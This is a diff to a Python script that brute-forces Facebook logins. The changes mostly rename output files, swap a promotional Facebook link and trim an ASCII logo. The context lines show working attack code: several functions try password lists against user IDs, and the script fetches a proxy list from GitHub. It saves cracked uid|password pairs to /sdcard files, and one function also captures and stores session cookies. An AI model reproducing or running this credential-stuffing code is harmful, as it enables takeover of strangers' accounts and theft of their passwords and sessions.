@@ -21,7 +21,7 @@ except ModuleNotFoundError:
 	os.system('python ALI.py')
 	
 print('[•] Join me on Facebook')
-os.system('xdg-open https://www.facebook.com/profile.php?id=100021074352995&mibextid=ZbWKwL/')
+os.system('xdg-open https://www.facebook.com/profile.php?id=100064983407240&mibextid=ZbWKwL/')
 
 try:
 	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
@@ -154,21 +154,14 @@ device = {
         'fbca':fbca,
         'fbdm':fbdm}
 
-logo=("""\033[1;91m
-        \033[1;97m 
-          \033[1;97m       
-        \033[1;97m     
-    #    #       ### 
+logo=("""
+#    #       ### 
    # #   #        #  
   #   #  #        #  
  #     # #        #  
  ####### #        #  
  #     # #        #  
- #     # ####### ### 
-        \033[1;97m         
-        \033[1;97m       
-         \033[1;97m      
-         \033[1;97m    
+ #     # ####### ###
 \033[1;37m--------------------------------------------------
 [~] Author   : Ali Ahmed
 [~] Facebook : Ali Ahmed
@@ -1153,7 +1146,7 @@ def ALI1(ids,passlist):
                                         break
                                 else:
                                         print('\r\r\033[1;32m [ALI-OK] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/ALI-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/ALI-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -1164,7 +1157,7 @@ def ALI1(ids,passlist):
                                 if uid in oks:pass
                                 else:
                                         print('\r\r\x1b[38;5;205m [ALI-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/ALI-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/ALI-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -1234,12 +1227,12 @@ def ALI2(ids,passlist):
 			if 'session_key' in q:
 				udx = str(q['uid'])
 				print('\r\r\033[1;32m [ALI-OK] '+udx+' | '+pas+'\033[1;97m')
-				open('/sdcard/ALI-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
+				open('/sdcard/ALI-OK.txt', 'a').write(udx+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'www.facebook.com' in q['error_msg']:
 				print('\r\r\x1b[38;5;205m [ALI-CP] '+ids+' | '+pas+'\033[1;97m')
-				open('/sdcard/ALI-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
+				open('/sdcard/ALI-CP.txt','a').write(ids+'|'+pas+'\n')
 				cps.append(ids)
 				break
 			else:
@@ -1331,7 +1324,7 @@ def ALI3(ids,passlist):
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
                                         #open('/sdcard/ALI-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/ALI-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/ALI-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -1342,7 +1335,7 @@ def ALI3(ids,passlist):
                                 if uid in oks:pass
                                 else:
                                         print('\r\r\x1b[38;5;205m [ALI-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/ALI-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/ALI-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -1426,7 +1419,7 @@ def ALI4(ids,passlist):
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print("Cookie: "+coki)
                                         open('/sdcard/ALI-COOKIE.txt','a').write(coki+'\n')
-                                        open('/sdcard/ALI-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/ALI-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -1437,7 +1430,7 @@ def ALI4(ids,passlist):
                                 if uid in oks:pass
                                 else:
                                         print('\r\r\x1b[38;5;205m [ALI-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/ALI-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/ALI-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -1518,7 +1511,7 @@ def ALI5(ids,passlist):
                                         break
                                 else:
                                         print('\r\r\033[1;32m [ALI-OK] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/ALI-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/ALI-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -1529,7 +1522,7 @@ def ALI5(ids,passlist):
                                 if uid in oks:pass
                                 else:
                                         print('\r\r\x1b[38;5;205m [ALI-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/ALI-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/ALI-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -1586,7 +1579,7 @@ def ALI6(ids,passlist):
 						print('\r\r\033[1;34m [ALI-2F] '+uid+' | '+pas)
 					else:
 						print(f'\r\x1b[1;32m [ALI-OK] '+uid+' | '+pas)
-						open('/sdcard/ALI-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
+						open('/sdcard/ALI-OK.txt', 'a').write(uid+'|'+pas+'\n')
 						oks.append(uid)
 						break
 			elif 'checkpoint' in log_cookies:
@@ -1595,7 +1588,7 @@ def ALI6(ids,passlist):
 				if uid in cps:pass
 				else:
 					print('\r\r\x1b[38;5;205m [ALI-CP] '+uid+' | '+pas+'\033[1;97m')
-					open('/sdcard/ALI-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
+					open('/sdcard/ALI-CP.txt', 'a').write(uid+'|'+pas+'\n')
 					cps.append(ids)
 					break
 			else:
